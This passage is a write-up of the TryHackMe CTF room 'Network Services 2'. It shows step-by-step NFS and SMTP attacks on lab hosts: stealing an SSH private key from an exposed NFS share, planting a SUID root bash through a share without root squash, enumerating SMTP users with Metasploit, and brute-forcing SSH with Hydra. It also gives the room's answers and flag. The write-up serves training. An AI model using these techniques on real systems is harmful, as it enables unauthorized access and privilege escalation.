# Network Services 2

Enumerating and Exploiting More Common Network Services & Misconfigurations

[Network Services 2](https://tryhackme.com/room/networkservices2)

## Topic's

- NFS Fundamentals
- NFS Enumeratuion
- NFS Exploitation
- SMTP Fundamentals
- SMTP Enumeratuion
- SMTP Exploitation
- MySQL Fundamentals
- MySQL Enumeratuion
- MySQL Exploitation

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Get Connected

Hello and welcome!

This room is a sequel to the first network services room. Similarly, it will explore a few more common Network Service vulnerabilities and misconfigurations that you're likely to find in CTFs, and some penetration test scenarios.

I would encourage you to complete the first network services room (https://tryhackme.com/room/networkservices) before attempting this one.

As with the previous room, it is definitely worth having a basic knowledge of Linux before attempting this room. If you think you'll need some help with this, try completing the 'Learn Linux' room (https://tryhackme.com/room/zthlinux)

Before we get started:

1. Connect to the TryHackMe OpenVPN Server (See https://tryhackme.com/access for help!)
2. Make sure you're sitting comfortably, and have a cup of Tea, Coffee or Water close!

Lets get started!

N.B. This is not a room on WiFi access hacking or hijacking, rather how to gain unauthorized access to a machine by exploiting network services. If you are interested in WiFi hacking, I suggest checking out WiFi Hacking 101 by NinjaJc01 (https://tryhackme.com/room/wifihacking101)

Ready? Let's get going!

`No answer needed`

## Task 2 Understanding NFS

**What is NFS?**

NFS stands for "Network File System" and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

**How does NFS work?**

Computer network - Vector stencils library | Computers ...

We don't need to understand the technical exchange in too much detail to be able to exploit NFS effectively- however if this is something that interests you, I would recommend this resource: [https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html](https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html)

First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.

The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

- The file handle
- The name of the file to be accessed
- The user's, user ID
- The user's group ID

These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.

**What runs NFS?**

Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.

**More Information:**

Here are some resources that explain the technical implementation, and working of, NFS in more detail than I have covered here.

- https://www.datto.com/library/what-is-nfs-file-share
- http://nfs.sourceforge.net/
- https://wiki.archlinux.org/index.php/NFS

What does NFS stand for?

`Network File System`

What process allows an NFS client to interact with a remote directory as though it was a physical device?

`mounting`

What does NFS use to represent files and directories on the server?

`file handle`

What protocol does NFS use to communicate between the server and client?

`RPC`

What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2

`user ID / group ID`

Can a Windows NFS server share files with a Linux client? (Y/N)

`Y`

Can a Linux NFS server share files with a MacOS client? (Y/N)

`Y`

What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.

`4.2`

## Task 3 Enumerating NFS

**Lets Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!

**What is Enumeration?**

Enumeration is defined as "a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system." - [Infosec Institute](https://resources.infosecinstitute.com/what-is-enumeration/). It is a critical phase when considering how to enumerate and exploit a remote machine- as the information you will use to inform your attacks will come from this stage

**Requirements**

In order to do more advanced enumeration of the NFS server, and shares- we're going to need a few tools. The first of which is key to interacting with any NFS share from your local machine- nfs-common.

**NFS-Common**

It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs. Primarily, we are concerned with "showmount" and "mount.nfs" as these are going to be most useful to us when it comes to extracting information from the NFS share. If you'd like more information about this package, feel free to read: https://packages.ubuntu.com/xenial/nfs-common.

You can install nfs-common using "`sudo apt install nfs-common`", it is part of the default repositories for most Linux distributions- such as the Kali Remote Machine that is provided to TryHackMe subscribers.

**Port Scanning**

Port scanning has been covered many times before, so I'll only cover the basics that you need for this room here. If you'd like to learn more about nmap in more detail please have a look at DarkStar's room on the topic, as part of the Red Primer series [here](https://tryhackme.com/room/rpnmap).

The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, open ports and operating system of the target machine. You can go as in depth as you like on this, however I suggest using nmap with the -A and -p- tags.

**Mounting NFS shares**

Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create this folder anywhere on your system. Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine. Like so:

`sudo mount -t nfs IP:share /tmp/mount/ -nolock`

Let's break this down

| Tag      | Function                                                                     |
| -------- | ---------------------------------------------------------------------------- |
| sudo     | Run as root                                                                  |
| mount    | Execute the mount command                                                    |
| -t nfs   | Type of device to mount, then specifying that it's NFS                       |
| IP:share | The IP Address of the NFS server, and the name of the share we wish to mount |
| -nolock  | Specifies not to use NLM locking                                             |

Now we understand our tools, lets get started!

```
kali@kali:~/CTFs/tryhackme/Network Services 2$ sudo nmap -A -p- -sS -sC -sV -O 10.10.145.224
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-13 16:08 CET
Nmap scan report for 10.10.145.224
Host is up (0.066s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 (RSA)
|   256 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff (ECDSA)
|_  256 bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36283/tcp   mountd
|   100005  1,2,3      49590/udp   mountd
|   100005  1,2,3      50279/udp6  mountd
|   100005  1,2,3      55283/tcp6  mountd
|   100021  1,3,4      36007/tcp   nlockmgr
|   100021  1,3,4      36951/udp   nlockmgr
|   100021  1,3,4      42259/tcp6  nlockmgr
|   100021  1,3,4      54401/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
32923/tcp open  mountd   1-3 (RPC #100005)
36007/tcp open  nlockmgr 1-4 (RPC #100021)
36283/tcp open  mountd   1-3 (RPC #100005)
36667/tcp open  mountd   1-3 (RPC #100005)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/13%OT=22%CT=1%CU=39307%PV=Y%DS=2%DC=T%G=Y%TM=5FAEA1
OS:A8%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
OS:1NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   68.98 ms 10.8.0.1
2   69.57 ms 10.10.145.224

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.44 seconds
```

Conduct a thorough port scan scan of your choosing, how many ports are open?

`7`

Which port contains the service we're looking to enumerate?

`2049`

Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?

```
kali@kali:~/CTFs/tryhackme/Network Services 2$ showmount -e 10.10.145.224
Export list for 10.10.145.224:
/home *
```

`/home`

Time to mount the share to our local machine!

First, use "mkdir /tmp/mount" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.

Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?

```
kali@kali:~/CTFs/tryhackme/Network Services 2$ sudo mkdir /tmp/mount
kali@kali:~/CTFs/tryhackme/Network Services 2$ sudo mount -t nfs 10.10.145.224:/home /tmp/mount/ -nolock
kali@kali:~/CTFs/tryhackme/Network Services 2$ ls -lA /tmp/mount/
total 4
drwxr-xr-x 5 kali kali 4096 Jun  4 16:37 cappucino
kali@kali:~/CTFs/tryhackme/Network Services 2$
```

`cappucino`

Have a look inside this directory, look at the files. Looks like we're inside a user's home directory...

```
kali@kali:~/CTFs/tryhackme/Network Services 2$ ls -lA /tmp/mount/cappucino
total 28
-rw------- 1 kali kali    5 Jun  4 16:38 .bash_history
-rw-r--r-- 1 kali kali  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kali kali 3771 Apr  4  2018 .bashrc
drwx------ 2 kali kali 4096 Apr 22  2020 .cache
drwx------ 3 kali kali 4096 Apr 22  2020 .gnupg
-rw-r--r-- 1 kali kali  807 Apr  4  2018 .profile
drwx------ 2 kali kali 4096 Apr 22  2020 .ssh
-rw-r--r-- 1 kali kali    0 Apr 22  2020 .sudo_as_admin_successful
```

`No answer needed`

Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?

```
kali@kali:~/CTFs/tryhackme/Network Services 2$ ls -lA /tmp/mount/cappucino/.ssh/
total 12
-rw------- 1 kali kali  399 Apr 22  2020 authorized_keys
-rw------- 1 kali kali 1679 Apr 22  2020 id_rsa
-rw-r--r-- 1 kali kali  399 Apr 22  2020 id_rsa.pub
```

`.ssh`

Which of these keys is most useful to us?

`id_rsa`

Copy this file to a different location your local machine, and change the permissions to "600" using "chmod 600 [file]".
Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.
Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)

```
kali@kali:~/CTFs/tryhackme/Network Services 2$ cp /tmp/mount/cappucino/.ssh/id_rsa .
kali@kali:~/CTFs/tryhackme/Network Services 2$ chmod 600 id_rsa
kali@kali:~/CTFs/tryhackme/Network Services 2$ ssh -i id_rsa cappucino@10.10.145.224
The authenticity of host '10.10.145.224 (10.10.145.224)' can't be established.
ECDSA key fingerprint is SHA256:YZbI4MCk+BQgHK2gc4cdmXuPTzO6m8CtiVRkPalFhlU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.145.224' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Nov 13 15:16:39 UTC 2020

  System load:  0.0               Processes:           102
  Usage of /:   45.2% of 9.78GB   Users logged in:     0
  Memory usage: 16%               IP address for eth0: 10.10.145.224
  Swap usage:   0%


44 packages can be updated.
0 updates are security updates.


Last login: Thu Jun  4 14:37:50 2020
cappucino@polonfs:~$
```

`Y`

## Task 4 Exploiting NFS

**We're done, right?**

Not quite, if you have a low privilege shell on any machine and you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.

**What is root_squash?**

By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

**SUID**

So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!

**Method**

This sounds complicated, but really- provided you're familiar with how SUID files work, it's fairly easy to understand. We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!

**The Executable**

Due to compatibility reasons, we'll use a standard Ubuntu Server 18.04 bash executable, the same as the server's- as we know from our nmap scan. You can download it [here](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash).

**Mapped Out Pathway:**

If this is still hard to follow, here's a step by step of the actions we're taking, and how they all tie together to allow us to gain a root shell:

- NFS Access ->
  - Gain Low Privilege Shell ->
    - Upload Bash Executable to the NFS share ->
      - Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->
        - Login through SSH ->
          - Execute SUID Bit Bash Executable ->
            - ROOT ACCESS

Lets do this!

First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.

```
kali@kali:~/CTFs/tryhackme/Network Services 2$ cp bash /tmp/mount/cappucino/
```

`No answer needed`

Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"

```
kali@kali:/tmp/mount/cappucino$ sudo chown root bash
```

`No answer needed`

Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?

```
kali@kali:/tmp/mount/cappucino$ sudo chmod +s bash
```

`s`

Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.

```
kali@kali:/tmp/mount/cappucino$ ls -la bash
-rwsr-sr-x 1 root kali 1113504 Nov 13 16:28 bash
```

`-rwsr-sr-x`

Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.

```
cappucino@polonfs:~$ ./bash -p
bash-4.4# whoami
root
bash-4.4#
```

`No answer needed`

Great! If all's gone well you should have a shell as root! What's the root flag?

```
bash-4.4# cat /root/root.txt
THM{nfs_got_pwned}
```

`THM{nfs_got_pwned}`

## Task 5 Understanding SMTP

**What is SMTP?**

SMTP stands for "Simple Mail Transfer Protocol". It is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP. Together they allow the user to send outgoing mail and retrieve incoming mail, respectively.

The SMTP server performs three basic functions:

- It verifies who is sending emails through the SMTP server.
- It sends the outgoing mail
- If the outgoing mail can't be delivered it sends the message back to the sender

Most people will have encountered SMTP when configuring a new email address on some third-party email clients, such as Thunderbird; as when you configure a new email client, you will need to configure the SMTP server configuration in order to send outgoing emails.

**POP and IMAP**

POP, or "Post Office Protocol" and IMAP, "Internet Message Access Protocol" are both email protocols who are responsible for the transfer of email between a client and a mail server. The main differences is in POP's more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronise the current inbox, with new mail on the server, downloading anything new. This means that changes to the inbox made on one computer, over IMAP, will persist if you then synchronise the inbox from another computer. The POP/IMAP server is responsible for fulfiling this process.

**How does SMTP work?**

Email delivery functions much the same as the physical mail delivery system. The user will supply the email (a letter) and a service (the postal delivery service), and through a series of steps- will deliver it to the recipients inbox (postbox). The role of the SMTP server in this service, is to act as the sorting office, the email (letter) is picked up and sent to this server, which then directs it to the recipient.

We can map the journey of an email from your computer to the recipient’s like this:

![](https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Networks%202/untitled.png)

1. The mail user agent, which is either your email client or an external program. connects to the SMTP server of your domain, e.g. smtp.google.com. This initiates the SMTP handshake. This connection works over the SMTP port- which is usually 25. Once these connections have been made and validated, the SMTP session starts.
2. The process of sending mail can now begin. The client first submits the sender, and recipient's email address- the body of the email and any attachments, to the server.
3. The SMTP server then checks whether the domain name of the recipient and the sender is the same.
4. The SMTP server of the sender will make a connection to the recipient's SMTP server before relaying the email. If the recipient's server can't be accessed, or is not available- the Email gets put into an SMTP queue.
5. The recipient’s SMTP server verifies the incoming email. If the domain and user name has been recognized, the server forwards the email to the POP or IMAP server.
6. Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognised. The server will then forward the email to the POP or IMAP server, as shown in the diagram above.
7. The E-Mail will then show up in the recipient's inbox.

This is a very simplified version of the process, and there are a lot of sub-protocols, communications and details that haven't been included. If you're looking to learn more about this topic, this is a really friendly to read breakdown of the finer technical details- I actually used it to write this breakdown:

https://computer.howstuffworks.com/e-mail-messaging/email3.htm

**What runs SMTP?**

SMTP Server software is readily available on Windows server platforms, with many other variants of SMTP being available to run on Linux.

**More Information:**

Here is a resource that explain the technical implementation, and working of, SMTP in more detail than I have covered here.

https://www.afternerd.com/blog/smtp/

What does SMTP stand for?

`Simple Mail Transfer Protocol`

What does SMTP handle the sending of?

`EMails`

What is the first step in the SMTP process?

`SMTP handshake`

What is the default SMTP port?

`25`

Where does the SMTP server send the email if the recipient's server is not available?

`SMTP queue`

On what server does the Email ultimately end up on?

`POP/IMAP`

Can a Linux machine run an SMTP server? (Y/N)

`Y`

Can a Windows machine run an SMTP server? (Y/N)

`Y`

## Task 6 Enumerating SMTP

**Lets Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!

**Enumerating Server Details**

Poorly configured or vulnerable mail servers can often provide an initial foothold into a network, but prior to launching an attack, we want to fingerprint the server to make our targeting as precise as possible. We're going to use the "smtp_version" module in MetaSploit to do this. As its name implies, it will scan a range of IP addresses and determine the version of any mail servers it encounters.

**Enumerating Users from SMTP**

The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of user’s aliases and lists of e-mail (mailing lists). Using these SMTP commands, we can reveal a list of valid users

We can do this manually, over a telnet connection- however Metasploit comes to the rescue again, providing a handy module appropriately called "smtp_enum" that will do the legwork for us! Using the module is a simple matter of feeding it a host or range of hosts to scan and a wordlist containing usernames to enumerate.

**Requirements**

As we're going to be using Metasploit for this, it's important that you have Metasploit installed. It is by default on both Kali Linux and Parrot OS; however, it's always worth doing a quick update to make sure that you're on the latest version before launching any attacks. You can do this with a simple "sudo apt update", and accompanying upgrade- if any are required.

**Alternatives**

It's worth noting that this enumeration technique will work for the majority of SMTP configurations; however there are other, non-metasploit tools such as smtp-user-enum that work even better for enumerating OS-level user accounts on Solaris via the SMTP service. Enumeration is performed by inspecting the responses to VRFY, EXPN, and RCPT TO commands.

This technique could be adapted in future to work against other vulnerable SMTP daemons, but this hasn’t been done as of the time of writing. It's an alternative that's worth keeping in mind if you're trying to distance yourself from using Metasploit e.g. in preparation for OSCP.

Now we've covered the theory. Let's get going!

First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?

`25`

Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?
If you would like some more help, or practice using, Metasploit, Darkstar has an amazing room on Metasploit that you can check out here: https://tryhackme.com/room/rpmetasploit

`msfconsole`

Let's search for the module "smtp_version", what's it's full module name?

```
msf5 > search smtp

Matching Modules
================

   #   Name                                                    Disclosure Date  Rank       Check  Description
   -   ----                                                    ---------------  ----       -----  -----------
   0   auxiliary/client/smtp/emailer                                            normal     No     Generic Emailer (SMTP)
   1   auxiliary/dos/smtp/sendmail_prescan                     2003-09-17       normal     No     Sendmail SMTP Address prescan Memory Corruption
   2   auxiliary/dos/windows/smtp/ms06_019_exchange            2004-11-12       normal     No     MS06-019 Exchange MODPROP Heap Overflow
   3   auxiliary/fuzzers/smtp/smtp_fuzzer                                       normal     No     SMTP Simple Fuzzer
   4   auxiliary/scanner/http/gavazzi_em_login_loot                             normal     No     Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database
   5   auxiliary/scanner/smtp/smtp_enum                                         normal     No     SMTP User Enumeration Utility
   6   auxiliary/scanner/smtp/smtp_ntlm_domain                                  normal     No     SMTP NTLM Domain Extraction
   7   auxiliary/scanner/smtp/smtp_relay                                        normal     No     SMTP Open Relay Detection
   8   auxiliary/scanner/smtp/smtp_version                                      normal     No     SMTP Banner Grabber
   9   auxiliary/server/capture/smtp                                            normal     No     Authentication Capture: SMTP
   10  auxiliary/vsploit/pii/email_pii                                          normal     No     VSploit Email PII
   11  exploit/linux/smtp/apache_james_exec                    2015-10-01       normal     Yes    Apache James Server 2.3.2 Insecure User Creation Arbitrary File Write
   12  exploit/linux/smtp/exim4_dovecot_exec                   2013-05-03       excellent  No     Exim and Dovecot Insecure Configuration Command Injection
   13  exploit/linux/smtp/exim_gethostbyname_bof               2015-01-27       great      Yes    Exim GHOST (glibc gethostbyname) Buffer Overflow
   14  exploit/linux/smtp/haraka                               2017-01-26       excellent  Yes    Haraka SMTP Command Injection
   15  exploit/unix/local/opensmtpd_oob_read_lpe               2020-02-24       average    Yes    OpenSMTPD OOB Read Local Privilege Escalation
   16  exploit/unix/smtp/clamav_milter_blackhole               2007-08-24       excellent  No     ClamAV Milter Blackhole-Mode Remote Code Execution
   17  exploit/unix/smtp/exim4_string_format                   2010-12-07       excellent  No     Exim4 string_format Function Heap Buffer Overflow
   18  exploit/unix/smtp/morris_sendmail_debug                 1988-11-02       average    Yes    Morris Worm sendmail Debug Mode Shell Escape
   19  exploit/unix/smtp/opensmtpd_mail_from_rce               2020-01-28       excellent  Yes    OpenSMTPD MAIL FROM Remote Code Execution
   20  exploit/unix/smtp/qmail_bash_env_exec                   2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
   21  exploit/unix/webapp/squirrelmail_pgp_plugin             2007-07-09       manual     No     SquirrelMail PGP Plugin Command Execution (SMTP)
   22  exploit/windows/browser/communicrypt_mail_activex       2010-05-19       great      No     CommuniCrypt Mail 1.16 SMTP ActiveX Stack Buffer Overflow
   23  exploit/windows/browser/oracle_dc_submittoexpress       2009-08-28       normal     No     Oracle Document Capture 10g ActiveX Control Buffer Overflow
   24  exploit/windows/email/ms07_017_ani_loadimage_chunksize  2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (SMTP)
   25  exploit/windows/http/mdaemon_worldclient_form2raw       2003-12-29       great      Yes    MDaemon WorldClient form2raw.cgi Stack Buffer Overflow
   26  exploit/windows/smtp/mailcarrier_smtp_ehlo              2004-10-26       good       Yes    TABS MailCarrier v2.51 SMTP EHLO Overflow
   27  exploit/windows/smtp/mercury_cram_md5                   2007-08-18       great      No     Mercury Mail SMTP AUTH CRAM-MD5 Buffer Overflow
   28  exploit/windows/smtp/ms03_046_exchange2000_xexch50      2003-10-15       good       Yes    MS03-046 Exchange 2000 XEXCH50 Heap Overflow
   29  exploit/windows/smtp/njstar_smtp_bof                    2011-10-31       normal     Yes    NJStar Communicator 3.00 MiniSMTP Buffer Overflow
   30  exploit/windows/smtp/sysgauge_client_bof                2017-02-28       normal     No     SysGauge SMTP Validation Buffer Overflow
   31  exploit/windows/smtp/wmailserver                        2005-07-11       average    No     SoftiaCom WMailserver 1.0 Buffer Overflow
   32  exploit/windows/smtp/ypops_overflow1                    2004-09-27       average    Yes    YPOPS 0.6 Buffer Overflow
   33  exploit/windows/ssl/ms04_011_pct                        2004-04-13       average    No     MS04-011 Microsoft Private Communications Transport Overflow
   34  post/windows/gather/credentials/outlook                                  normal     No     Windows Gather Microsoft Outlook Saved Password Extraction


Interact with a module by name or index, for example use 34 or use post/windows/gather/credentials/outlook
```

`auxiliary/scanner/smtp/smtp_version`

Great, now- select the module and list the options. How do we do this?

```
msf5 > use auxiliary/scanner/smtp/smtp_version
msf5 auxiliary(scanner/smtp/smtp_version) > options

Module options (auxiliary/scanner/smtp/smtp_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    25               yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)
```

``

Have a look through the options, does everything seem correct? What is the option we need to set?

```
msf5 auxiliary(scanner/smtp/smtp_version) > set RHOSTS 10.10.72.209
RHOSTS => 10.10.72.209
```

`RHOSTS`

Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?

```
msf5 auxiliary(scanner/smtp/smtp_version) > run

[+] 10.10.72.209:25       - 10.10.72.209:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.72.209:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

``

What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.

`Postfix`

Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module "smtp_enum", what's it's full module name?

```
msf5 > use auxiliary/scanner/smtp/smtp_enum
msf5 auxiliary(scanner/smtp/smtp_enum) > options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                                                Required  Description
   ----       ---------------                                                --------  -----------
   RHOSTS                                                                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      25                                                             yes       The target port (TCP)
   THREADS    1                                                              yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.
```

`auxiliary/scanner/smtp/smtp_enum`

We're going to be using the "top-usernames-shortlist.txt" wordlist from the Usernames subsection of seclists (/usr/share/seclists/Usernames if you have it installed).

Seclists is an amazing collection of wordlists. If you're running Kali or Parrot you can install seclists with: "sudo apt install seclists" Alternatively, you can download the repository from here.

What option do we need to set to the wordlist's path?

```
msf5 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txtUSER_FILE => /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
```

`USER_FILE`

Once we've set this option, what is the other essential paramater we need to set?

```
msf5 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 10.10.72.209
RHOSTS => 10.10.72.209
```

`RHOSTS`

Now, set the THREADS parameter to 16 and run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated!

```
msf5 auxiliary(scanner/smtp/smtp_enum) > set THREADS 16
THREADS => 16
```

`No answer needed`

Okay! Now that's finished, what username is returned?

```
msf5 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.10.72.209:25       - 10.10.72.209:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
[+] 10.10.72.209:25       - 10.10.72.209:25 Users found: administrator
[*] 10.10.72.209:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

`administrator`

## Task 7 Exploiting SMTP

**What do we know?**

Okay, at the end of our Enumeration section we have a few vital pieces of information:

1. A user account name
2. The type of SMTP server and Operating System running.

We know from our port scan, that the only other open port on this machine is an SSH login. We're going to use this information to try and bruteforce the password of the SSH login for our user using Hydra.

**Preparation**

It's advisable that you exit Metasploit to continue the exploitation of this section of the room. Secondly, it's useful to keep a note of the information you gathered during the enumeration stage, to aid in the exploitation.

**Hydra**

There is a wide array of customisability when it comes to using Hydra, and it allows for adaptive password attacks against of many different services, including SSH. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub here.

Hydra uses dictionary attacks primarily, both Kali Linux and Parrot OS have many different wordlists in the "/usr/share/wordlists" directory- if you'd like to browse and find a different wordlists to the widely used "rockyou.txt". Likewise I recommend checking out SecLists for a wider array of other wordlists that are extremely useful for all sorts of purposes, other than just password cracking. E.g. subdomain enumeration

The syntax for the command we're going to use to find the passwords is this: "`hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.72.209 ssh`"

Let's break it down:

| SECTION        | FUNCTION                                                                             |
| -------------- | ------------------------------------------------------------------------------------ |
| hydra          | Runs the hydra tool                                                                  |
| -t 16          | Number of parallel connections per target                                            |
| -l [user]      | Points to the user who's account you're trying to compromise                         |
| -P             | [path to dictionary] Points to the file containing the list of possible passwords    |
| -vV            | Sets verbose mode to very verbose, shows the login+pass combination for each attempt |
| [machine IP]   | The IP address of the target machine                                                 |
| ssh / protocol | Sets the protocol                                                                    |

Looks like we're ready to rock n roll!

What is the password of the user we found during our enumeration stage?

```
kali@kali:~/CTFs/tryhackme/Network Services 2$ hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.72.209 ssh
